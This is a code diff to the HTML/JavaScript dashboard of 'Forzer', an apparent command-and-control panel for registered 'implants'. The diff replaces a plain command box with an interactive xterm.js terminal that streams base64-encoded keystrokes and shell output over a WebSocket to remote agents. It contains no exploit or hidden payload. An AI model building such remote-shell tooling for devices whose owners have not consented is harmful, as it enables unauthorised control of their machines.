@@ -4,6 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Forzer &middot; Control Plane Dashboard</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/css/xterm.css" />
 <style>
   :root {
     --bg: #0b0f17;
@@ -100,8 +101,8 @@
    tbody tr.active { background: rgba(79, 157, 255, 0.12); }
 
    .console {
-     position: fixed; top: 0; right: 0; height: 100vh; width: 460px; max-width: 92vw;
-     background: var(--panel); border-left: 1px solid var(--border);
+     position: fixed; top: 0; right: 0; height: 100vh; width: 720px; max-width: 95vw;
+     background: #000; border-left: 1px solid var(--border);
      display: flex; flex-direction: column; transform: translateX(100%);
      transition: transform 0.22s ease; z-index: 50;
      box-shadow: -12px 0 40px rgba(0,0,0,0.45);
@@ -109,7 +110,8 @@
    .console.open { transform: translateX(0); }
    .console-head {
      display: flex; align-items: center; justify-content: space-between;
-     padding: 14px 18px; border-bottom: 1px solid var(--border);
+     padding: 10px 18px; border-bottom: 1px solid var(--border);
+     background: var(--panel);
    }
    .console-head h3 { margin: 0; font-size: 15px; }
    .console-head .meta { color: var(--muted); font-size: 12px; margin-top: 3px; }
@@ -118,14 +120,15 @@
      width: 30px; height: 30px; border-radius: 8px; cursor: pointer; font-size: 16px;
    }
    .console-close:hover { border-color: var(--accent); }
-   .console-out {
-     flex: 1; overflow: auto; padding: 14px 18px; font-family: "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
-     font-size: 12.5px; white-space: pre-wrap; word-break: break-word; color: var(--text);
+   #term-container {
+     flex: 1; overflow: hidden;
    }
-   .console-out .cmd { color: var(--accent); }
-   .console-out .cmd:before { content: "$ "; color: var(--muted); }
-   .console-out .err { color: var(--danger); }
-   .console-out .sys { color: var(--muted); font-style: italic; }
+   #term-container .xterm { height: 100%; }
+   /* Command mode styles */
+   .cmd { color: var(--accent); }
+   .cmd:before { content: "$ "; color: var(--muted); }
+   .err { color: var(--danger); }
+   .sys { color: var(--muted); font-style: italic; }
    .console-in {
      display: flex; border-top: 1px solid var(--border); padding: 10px; gap: 8px;
      background: var(--panel-2);
@@ -265,12 +268,11 @@
             <button class="console-close" id="console-close" title="Close">&times;</button>
           </div>
         </div>
-        <div class="console-out" id="console-out"></div>
-        <div class="console-in">
+        <div id="console-out" style="flex:1;overflow:auto;padding:14px 18px;font-family:monospace;font-size:12.5px;white-space:pre-wrap;word-break:break-word;color:var(--text);"></div>
+        <div id="term-container" style="display:none;flex:1;overflow:hidden;"></div>
+        <div class="console-in" id="cmd-input-bar">
           <input id="console-input" type="text" placeholder="type a command and press Enter…" autocomplete="off" />
           <button id="console-send">Run</button>
-          <button id="term-ctrlc" style="display:none;background:var(--panel-2);border:1px solid var(--border);color:var(--warn);border-radius:8px;padding:0 12px;cursor:pointer;font-weight:600;">Ctrl-C</button>
-          <button id="term-end" style="display:none;background:var(--panel-2);border:1px solid var(--border);color:var(--danger);border-radius:8px;padding:0 12px;cursor:pointer;font-weight:600;">End</button>
         </div>
       </div>
 
@@ -289,6 +291,9 @@
     Forzer control plane &middot; register implants with <code class="k">FORZER_SERVER</code> pointing here &middot; dashboard is read-only
   </footer>
 
+<script src="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-web-links@0.11.0/lib/addon-web-links.min.js"></script>
 <script>
   var dot = document.getElementById('dot');
   var conn = document.getElementById('conn');
@@ -385,11 +390,13 @@
     if (!p) return;
     activePeerId = id;
     consoleTitle.textContent = (p.name || 'unnamed') + '  (' + (p.ip || '') + ')';
-    consoleMeta.textContent = 'id ' + id + ' · click a row, type a command, Enter to run';
+    consoleMeta.textContent = 'id ' + id + ' · click "Live Terminal" for an interactive shell';
     consoleOut.innerHTML = '';
-    appendSys('Connected to peer. Commands run on the device via the agent.');
+    appendSys('Connected to peer. Click "Live Terminal" for an interactive shell.');
     consoleEl.classList.add('open');
     markActive();
+    // If terminal is active, fit it after the drawer animation
+    setTimeout(function () { if (fitAddon) fitAddon.fit(); }, 250);
     consoleInput.focus();
   }
 
@@ -431,7 +438,12 @@
   /* --------------------------- Live terminal --------------------------- */
   var termActive = false;
   var termId = null;
-  var b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+  var xterm = null;
+  var fitAddon = null;
+  var termContainer = document.getElementById('term-container');
+  var cmdOut = document.getElementById('console-out');
+  var cmdInputBar = document.getElementById('cmd-input-bar');
+
   function b64enc(str) {
     var out = '';
     for (var i = 0; i < str.length; i += 3) {
@@ -439,53 +451,112 @@
       var b1 = i + 1 < str.length ? str.charCodeAt(i + 1) & 0xff : 0;
       var b2 = i + 2 < str.length ? str.charCodeAt(i + 2) & 0xff : 0;
       var v = (b0 << 16) | (b1 << 8) | b2;
-      out += b64chars[(v >> 18) & 63] + b64chars[(v >> 12) & 63];
-      out += i + 1 < str.length ? b64chars[(v >> 6) & 63] : '=';
-      out += i + 2 < str.length ? b64chars[v & 63] : '=';
+      out += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(v >> 18) & 63];
+      out += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(v >> 12) & 63];
+      out += i + 1 < str.length ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(v >> 6) & 63] : '=';
+      out += i + 2 < str.length ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[v & 63] : '=';
     }
     return out;
   }
   function b64dec(s) {
-    // atob already returns the decoded binary string; just use it directly.
     try { return decodeURIComponent(escape(atob(s))); }
     catch (e) { return atob(s); }
   }
+
   function termStart() {
     if (!activePeerId || termActive) return;
     termId = 't' + (++reqCounter) + '-' + Date.now().toString(36);
     termActive = true;
-    consoleOut.innerHTML = '';
-    appendSys('starting live shell…');
+
+    // Switch UI: hide command output/input, show xterm
+    cmdOut.style.display = 'none';
+    cmdInputBar.style.display = 'none';
+    termContainer.style.display = '';
+
+    // Create xterm instance
+    xterm = new Terminal({
+      cursorBlink: true,
+      fontSize: 14,
+      fontFamily: '"JetBrains Mono", "Cascadia Code", "Fira Code", ui-monospace, Menlo, Consolas, monospace',
+      theme: {
+        background: '#0a0e17',
+        foreground: '#e6edf6',
+        cursor: '#4f9dff',
+        cursorAccent: '#0a0e17',
+        selectionBackground: 'rgba(79,157,255,0.3)',
+        black: '#1a2033',
+        red: '#ff5d6c',
+        green: '#36d399',
+        yellow: '#ffb454',
+        blue: '#4f9dff',
+        magenta: '#c678dd',
+        cyan: '#56b6c2',
+        white: '#e6edf6',
+        brightBlack: '#5d6b82',
+        brightRed: '#ff8b94',
+        brightGreen: '#5eecc1',
+        brightYellow: '#ffd39a',
+        brightBlue: '#7fb8ff',
+        brightMagenta: '#d9a0ec',
+        brightCyan: '#7ec8e3',
+        brightWhite: '#ffffff'
+      },
+      allowProposedApi: true
+    });
+    fitAddon = new FitAddon.FitAddon();
+    xterm.loadAddon(fitAddon);
+    try {
+      var webLinks = new WebLinksAddon.WebLinksAddon();
+      xterm.loadAddon(webLinks);
+    } catch (e) { /* optional */ }
+
+    xterm.open(termContainer);
+    fitAddon.fit();
+
+    // Send terminal size to agent (via a special resize command in the data)
+    var cols = xterm.cols;
+    var rows = xterm.rows;
+
+    // Pipe keyboard input to the agent
+    xterm.onData(function (data) {
+      if (!termActive || !ws || ws.readyState !== 1) return;
+      ws.send(JSON.stringify({ type: 'term-input', to: activePeerId, id: termId, data: b64enc(data) }));
+    });
+
+    // Handle resize
+    xterm.onResize(function (size) {
+      // Future: send resize event to agent if supported
+    });
+
     document.getElementById('term-toggle').textContent = 'Terminal: ON';
-    document.getElementById('term-ctrlc').style.display = '';
-    document.getElementById('term-end').style.display = '';
-    consoleInput.placeholder = 'type into the shell (Enter sends \\n, Ctrl-C button to interrupt)';
     if (ws && ws.readyState === 1)
       ws.send(JSON.stringify({ type: 'term-start', to: activePeerId, id: termId }));
+
+    // Focus the terminal
+    setTimeout(function () { xterm.focus(); fitAddon.fit(); }, 100);
   }
+
   function termStop() {
     if (!termActive) return;
     termActive = false;
     document.getElementById('term-toggle').textContent = 'Live Terminal';
-    document.getElementById('term-ctrlc').style.display = 'none';
-    document.getElementById('term-end').style.display = 'none';
-    consoleInput.placeholder = 'type a command and press Enter…';
+
+    // Destroy xterm instance
+    if (xterm) { xterm.dispose(); xterm = null; fitAddon = null; }
+
+    // Switch UI back: show command output/input
+    termContainer.style.display = 'none';
+    cmdOut.style.display = '';
+    cmdInputBar.style.display = '';
+
     if (ws && ws.readyState === 1 && termId)
       ws.send(JSON.stringify({ type: 'term-end', to: activePeerId, id: termId }));
     termId = null;
   }
-  function termSendInput(text) {
-    if (!termActive || !ws || ws.readyState !== 1) return;
-    ws.send(JSON.stringify({ type: 'term-input', to: activePeerId, id: termId, data: b64enc(text) }));
-  }
 
   function sendOrTerm() {
-    if (termActive) {
-      termSendInput(consoleInput.value + '\n');
-      consoleInput.value = '';
-    } else {
-      sendCommand();
-    }
+    if (termActive) return; // xterm handles input directly
+    sendCommand();
   }
 
   document.getElementById('console-send').addEventListener('click', sendOrTerm);
@@ -495,10 +566,6 @@
   document.getElementById('term-toggle').addEventListener('click', function () {
     if (termActive) termStop(); else termStart();
   });
-  document.getElementById('term-ctrlc').addEventListener('click', function () {
-    termSendInput('\u0003'); // Ctrl-C
-  });
-  document.getElementById('term-end').addEventListener('click', termStop);
   document.getElementById('console-close').addEventListener('click', function () {
     if (termActive) termStop();
     activePeerId = null;
@@ -553,21 +620,22 @@
           }
         } else if (msg.type === 'term-data') {
           // streaming shell output for the active session (base64 payload)
-          if (msg.id === termId && termActive) {
-            if (msg.data) appendResult(b64dec(msg.data));
+          if (msg.id === termId && termActive && xterm) {
+            if (msg.data) xterm.write(b64dec(msg.data));
           }
         } else if (msg.type === 'term-exit') {
           if (msg.id === termId) {
-            appendSys('--- shell exited (rc=' + (msg.rc == null ? '?' : msg.rc) + ') ---');
+            if (xterm) xterm.write('\r\n\x1b[33m--- shell exited ---\x1b[0m\r\n');
             termActive = false;
             document.getElementById('term-toggle').textContent = 'Live Terminal';
-            document.getElementById('term-ctrlc').style.display = 'none';
-            document.getElementById('term-end').style.display = 'none';
-            consoleInput.placeholder = 'type a command and press Enter…';
+            if (xterm) { xterm.dispose(); xterm = null; fitAddon = null; }
+            termContainer.style.display = 'none';
+            cmdOut.style.display = '';
+            cmdInputBar.style.display = '';
             termId = null;
           }
         } else if (msg.type === 'term-end') {
-          if (msg.id === termId) appendSys('--- session closed ---');
+          if (msg.id === termId && xterm) xterm.write('\r\n\x1b[33m--- session closed ---\x1b[0m\r\n');
         }
       } catch (e) { /* ignore */ }
     };
@@ -623,6 +691,11 @@
     showLogin();
     loginUser.value = '';
     loginPass.value = '';
+  });
+
+  // Resize xterm when window resizes
+  window.addEventListener('resize', function () {
+    if (fitAddon) fitAddon.fit();
   });
 </script>
 </body>
